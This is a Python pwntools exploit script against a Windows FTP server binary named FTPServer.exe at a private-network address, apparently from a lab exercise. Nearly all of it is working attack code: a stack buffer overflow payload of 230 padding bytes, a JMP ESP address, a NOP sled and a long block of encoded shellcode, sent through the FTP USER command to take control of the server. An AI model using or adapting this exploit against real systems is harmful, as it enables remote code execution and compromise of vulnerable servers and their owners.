#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='i386')
exe = 'FTPServer.exe'

host = args.HOST or '192.168.34.148'
port = int(args.PORT or 21)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

# bar chars: 00, 0a, 0d

shellcode =  ""
shellcode += "\xdb\xd5\xba\xb8\x8a\x10\x40\xd9\x74\x24\xf4"
shellcode += "\x5d\x31\xc9\xb1\x52\x83\xed\xfc\x31\x55\x13"
shellcode += "\x03\xed\x99\xf2\xb5\xf1\x76\x70\x35\x09\x87"
shellcode += "\x15\xbf\xec\xb6\x15\xdb\x65\xe8\xa5\xaf\x2b"
shellcode += "\x05\x4d\xfd\xdf\x9e\x23\x2a\xd0\x17\x89\x0c"
shellcode += "\xdf\xa8\xa2\x6d\x7e\x2b\xb9\xa1\xa0\x12\x72"
shellcode += "\xb4\xa1\x53\x6f\x35\xf3\x0c\xfb\xe8\xe3\x39"
shellcode += "\xb1\x30\x88\x72\x57\x31\x6d\xc2\x56\x10\x20"
shellcode += "\x58\x01\xb2\xc3\x8d\x39\xfb\xdb\xd2\x04\xb5"
shellcode += "\x50\x20\xf2\x44\xb0\x78\xfb\xeb\xfd\xb4\x0e"
shellcode += "\xf5\x3a\x72\xf1\x80\x32\x80\x8c\x92\x81\xfa"
shellcode += "\x4a\x16\x11\x5c\x18\x80\xfd\x5c\xcd\x57\x76"
shellcode += "\x52\xba\x1c\xd0\x77\x3d\xf0\x6b\x83\xb6\xf7"
shellcode += "\xbb\x05\x8c\xd3\x1f\x4d\x56\x7d\x06\x2b\x39"
shellcode += "\x82\x58\x94\xe6\x26\x13\x39\xf2\x5a\x7e\x56"
shellcode += "\x37\x57\x80\xa6\x5f\xe0\xf3\x94\xc0\x5a\x9b"
shellcode += "\x94\x89\x44\x5c\xda\xa3\x31\xf2\x25\x4c\x42"
shellcode += "\xdb\xe1\x18\x12\x73\xc3\x20\xf9\x83\xec\xf4"
shellcode += "\xae\xd3\x42\xa7\x0e\x83\x22\x17\xe7\xc9\xac"
shellcode += "\x48\x17\xf2\x66\xe1\xb2\x09\xe1\xce\xeb\x33"
shellcode += "\x7b\xa6\xe9\x33\x5c\x38\x67\xd5\xc8\x56\x21"
shellcode += "\x4e\x65\xce\x68\x04\x14\x0f\xa7\x61\x16\x9b"
shellcode += "\x44\x96\xd9\x6c\x20\x84\x8e\x9c\x7f\xf6\x19"
shellcode += "\xa2\x55\x9e\xc6\x31\x32\x5e\x80\x29\xed\x09"
shellcode += "\xc5\x9c\xe4\xdf\xfb\x87\x5e\xfd\x01\x51\x98"
shellcode += "\x45\xde\xa2\x27\x44\x93\x9f\x03\x56\x6d\x1f"
shellcode += "\x08\x02\x21\x76\xc6\xfc\x87\x20\xa8\x56\x5e"
shellcode += "\x9e\x62\x3e\x27\xec\xb4\x38\x28\x39\x43\xa4"
shellcode += "\x99\x94\x12\xdb\x16\x71\x93\xa4\x4a\xe1\x5c"
shellcode += "\x7f\xcf\x01\xbf\x55\x3a\xaa\x66\x3c\x87\xb7"
shellcode += "\x98\xeb\xc4\xc1\x1a\x19\xb5\x35\x02\x68\xb0"
shellcode += "\x72\x84\x81\xc8\xeb\x61\xa5\x7f\x0b\xa0"

jmpesp = '\x27\xb2\xfa\x77'

payload = 'A' * 230 + jmpesp + '\x90' * 32 + shellcode

io = start()

info(io.recv(4096).decode('utf-8', 'replace'))
io.sendline(f'USER {payload}')
info(io.recv(4096).decode('utf-8', 'replace'))
